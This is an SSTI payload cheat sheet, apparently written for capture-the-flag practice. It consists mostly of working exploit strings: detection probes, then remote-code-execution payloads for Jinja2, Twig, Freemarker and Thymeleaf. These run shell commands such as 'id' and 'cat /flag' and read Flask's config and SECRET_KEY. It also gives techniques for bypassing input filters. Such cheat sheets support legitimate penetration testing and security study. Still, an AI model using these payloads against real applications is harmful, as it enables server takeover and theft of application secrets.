# Server-Side Template Injection (SSTI)

## Detection Payloads
Test these in any user input field that might be rendered in a template:
```
{{7*7}}          -> 49 (Jinja2, Twig)
${7*7}           -> 49 (Freemarker, Velocity)
#{7*7}           -> 49 (Thymeleaf)
<%= 7*7 %>       -> 49 (ERB/Ruby)
{{7*'7'}}        -> 7777777 (Jinja2 confirms)
${7*'7'}         -> Error or 49 (not Jinja2)
```

## Jinja2 (Python/Flask) Exploitation

### Read Config / Secret Key
```
{{config}}
{{config.SECRET_KEY}}
{{self.__init__.__globals__}}
```

### RCE via MRO Chain
```
{{''.__class__.__mro__[1].__subclasses__()}}
```
Find `os._wrap_close` or `subprocess.Popen` index (e.g., index 132):
```
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}
```

### Common RCE Payloads
```
# Using os.popen
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}
{{joiner.__init__.__globals__.os.popen('ls /').read()}}

# Using __import__
{{''.__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# Using request object (Flask)
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('id').read()}}
```

### Filter Bypass
```
# If '.' is blocked, use ['attr'] or |attr()
{{''['__class__']['__mro__'][1]}}
{{''|attr('__class__')|attr('__mro__')|last}}

# If '_' is blocked, use hex or request
{{''['\x5f\x5fclass\x5f\x5f']}}
{{''[request.args.a]}}  (pass ?a=__class__)

# If '{{' is blocked, use {%%}
{% if ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read() %}1{% endif %}
{% print(lipsum.__globals__['os'].popen('id').read()) %}
```

## Twig (PHP) Exploitation
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /flag']|filter('system')}}
```

## Freemarker (Java) Exploitation
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

## Thymeleaf (Java) Exploitation
```
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
${T(java.lang.Runtime).getRuntime().exec('cat /flag')}
```
